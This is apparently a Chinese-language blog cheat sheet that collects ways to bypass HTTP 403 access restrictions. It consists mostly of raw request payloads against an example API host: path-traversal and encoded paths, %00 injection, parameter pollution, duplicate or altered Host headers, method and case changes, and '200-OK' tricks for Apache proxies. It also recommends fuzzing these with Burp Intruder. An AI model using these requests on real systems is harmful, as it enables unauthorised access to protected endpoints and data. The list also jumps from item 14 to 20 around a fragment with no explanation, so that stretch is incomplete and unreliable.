绕过403总结

渗透测试
渗透测试
发布日期:   2022-10-10

#1、通过数组包裹关键值

原数据：

POST /userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/json

{"emails":"random@gmail.com"}

修改后的数据：

POST /userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/json

{"emails":["random@gmail.com"]}

#2、用json包裹关键值

原数据：

POST /userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

id=1

修改后的数据：

POST /userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/json

{"id":"1"}

#3、修改请求方法

我们可以通过修改请求方法来绕过403，可用的的请求方法有：【GET、POST、PATCH、TRACE】

原数据：

POST /userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

id=1

修改后的数据

GET /userinfo?id=1 HTTP/1.1
Host: api.host.com

#4、在路由中添加/更改 API 版本

原数据1：

POST /userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

id=1

修改后的数据1：

POST /v1/userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

id=1

原数据2：

POST /v1/userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

id=1

修改后的数据2：

POST /v2/userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

id=1

#5、关键值作为通配符

原数据：

POST /userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

id=1

修改后的数据1:

POST /userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

id=

修改后的数据2:

POST /userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

id=*

#6、添加 URL 编码

原数据

POST /userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

id=1

修改后的数据:

POST /userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

id=1%00

除了对关键参数值添加URL编码，也可以尝试对路径添加URI编码，通过使用Intruder来批量fuzz可用的url编码。

POST /userinfo..%ff HTTP/1.1
POST /userinfo%2e%2e%2f HTTP/1.1
POST /userinfo%3f HTTP/1.1
POST /userinfo%23 HTTP/1.1

#7、路径穿越

原数据：

POST /userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

id=1

修改后的数据：

POST //userinfo HTTP/1.1
POST /../userinfo HTTP/1.1
POST /;../userinfo HTTP/1.1
POST /..;/userinfo HTTP/1.1
POST /userinfo/ HTTP/1.1
POST /%2f/userinfo/ HTTP/1.1
POST /userinfo../ HTTP/1.1
POST /..%3B/userinfo HTTP/1.1
POST /..%2e/userinfo HTTP/1.1
POST /.//userinfo HTTP/1.1
POST /./userinfo HTTP/1.1
POST /#/userinfo HTTP/1.1
POST /#/../userinfo HTTP/1.1
...

#8、参数污染

原数据：

POST /userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

id=1

修改后的数据：

POST /userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

id=2&id=1

#9、修改协议头

https://host.com/debug/   ----  403
http://host.com/debug/    ----  200

#10、添加Host头

原数据：

GET /debug/ HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

修改后的数据：

GET /debug/ HTTP/1.1
Host: api.host.com
Host: localhost
Content-Type: application/x-www-form-urlencoded

#11、修改Host头为host头

原数据：

GET /debug/ HTTP/1.1
Host: api.host.com
Host: localhost
Content-Type: application/x-www-form-urlencoded

修改后的数据：

GET /debug/ HTTP/1.1
host: api.host.com
Host: localhost
Content-Type: application/x-www-form-urlencoded

#12、删除Host头中的空格

原数据：

GET /debug/ HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

修改后的数据：

GET /debug/ HTTP/1.1
Host:api.host.com
Content-Type: application/x-www-form-urlencoded

#13、在Host头中添加空格

原数据:

GET /debug/ HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

修改后的数据:

GET /debug/ HTTP/1.1
Host:  api.host.com
Content-Type: application/x-www-form-urlencoded

#14、修改后缀

原数据：

POST /userinfo HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

id=1

修改后的数据:

POST /userinfo.json HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

id=1

可以使用Intruder模块批量fuzz后缀名

原数据：

GET / HTTP/1.1

X-Original-URL: /debug/
Content-Type: application/x-www-form-urlencoded

GET http://api.host.com/debug/ HTTP/1.1

#20、通过大小写转换的方式绕过

原数据：

GET /debug/ HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

修改后的数据:

GET /DEBUG/ HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

#21、添加200-OK绕过403

如果有Apache作为代理，我们可以通过在接口中添加200-OK来绕过403

原数据

GET /debug/ HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

修改后的数据

GET /200-OK/..//debug/ HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

第二种方式是通过200-OK+%2e%2e的组合来绕过403

GET /200-OK/%2e%2e/debug/ HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

第三种和第二种相似，只是我们在200-OK后面添加个空格

GET /200-OK%20/%2e%2e/debug/ HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

第四种通过；来绕过限制

GET /200-OK/;debug/ HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

除了在前面添加，我们也可以在后面添加

GET /debug;/../200-OK HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

#22、在接口后面添加？

GET /debug? HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

#23、修改请求方法为小写

我们通过将请求方法修改为小写的方式来绕过，比如GET -> GeT、POST -> Post

原数据

GET /debug HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded

修改后的数据

GeT /debug HTTP/1.1
Host: api.host.com
Content-Type: application/x-www-form-urlencoded
